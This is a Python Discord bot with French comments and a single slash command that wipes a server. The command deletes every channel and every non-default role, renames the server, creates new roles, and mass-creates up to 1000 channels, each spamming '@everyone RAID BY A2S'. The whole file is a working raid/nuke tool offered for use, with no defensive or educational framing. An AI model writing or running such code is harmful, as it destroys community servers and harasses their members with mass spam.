import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os

TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.members = True  # utile pour rôles

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Bot connecté : {bot.user}")


@bot.tree.command(
    name="createsalons",
    description="Supprime tout + recrée salons + rôles + rename serveur"
)
@app_commands.describe(
    nom="Nom des salons",
    nombre="Nombre de salons (max 1000)",
    nom_serveur="Nouveau nom du serveur",
    nom_role="Nom des nouveaux rôles",
    categorie_id="ID catégorie (optionnel)"
)
@app_commands.checks.has_permissions(manage_channels=True, manage_guild=True)
async def createsalons(
    interaction: discord.Interaction,
    nom: str,
    nombre: int,
    nom_serveur: str,
    nom_role: str,
    categorie_id: str = None
):

    if nombre < 1 or nombre > 1000:
        await interaction.response.send_message(
            "❌ Le nombre doit être entre 1 et 1000.",
            ephemeral=True
        )
        return

    await interaction.response.send_message(
        "⏳ Nettoyage du serveur (salons + rôles) en cours...",
        ephemeral=True
    )

    guild = interaction.guild

    # =========================
    # 🔥 1. SUPPRESSION SALONS
    # =========================
    try:
        await asyncio.gather(
            *[c.delete() for c in guild.channels],
            return_exceptions=True
        )
    except Exception as e:
        await interaction.edit_original_response(
            content=f"❌ Erreur suppression salons: {e}"
        )
        return

    # =========================
    # 🔥 2. SUPPRESSION ROLES
    # =========================
    try:
        await asyncio.gather(
            *[
                r.delete()
                for r in guild.roles
                if not r.is_default() and not r.managed
            ],
            return_exceptions=True
        )
    except Exception as e:
        await interaction.edit_original_response(
            content=f"❌ Erreur suppression rôles: {e}"
        )
        return

    # =========================
    # 🔥 3. RENOMMER SERVEUR
    # =========================
    try:
        await guild.edit(name=nom_serveur)
    except discord.Forbidden:
        await interaction.edit_original_response(
            content="❌ Permission refusée pour renommer le serveur."
        )
        return

    # =========================
    # 🔥 4. RECREER ROLES
    # =========================
    try:
        roles = []
        for i in range(5):  # tu peux changer le nombre
            role = await guild.create_role(name=f"{nom_role}-{i+1}")
            roles.append(role)
    except Exception as e:
        await interaction.edit_original_response(
            content=f"❌ Erreur création rôles: {e}"
        )
        return

    # =========================
    # 🔥 5. CATEGORIE OPTIONNELLE
    # =========================
    categorie = None
    if categorie_id:
        try:
            categorie = guild.get_channel(int(categorie_id))
        except:
            categorie = None

    # =========================
    # 🔥 6. CREATION SALONS
    # =========================
    semaphore = asyncio.Semaphore(10)

    async def create_channel(i):
        async with semaphore:
            channel = await guild.create_text_channel(
                name=f"{nom}-{i+1}",
                category=categorie
            )
            try:
                await channel.send("@everyone RAID BY A2S")
            except:
                pass

    await asyncio.gather(
        *[create_channel(i) for i in range(nombre)],
        return_exceptions=True
    )

    # =========================
    # ✅ FIN
    # =========================
    await interaction.edit_original_response(
        content=(
            f"✅ Serveur nettoyé et recréé !\n"
            f"- Serveur: `{nom_serveur}`\n"
            f"- Salons: {nombre}\n"
            f"- Rôles: 5 (`{nom_role}-X`)"
        )
    )


@createsalons.error
async def createsalons_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message(
            "❌ Permissions insuffisantes.",
            ephemeral=True
        )


bot.run(TOKEN)
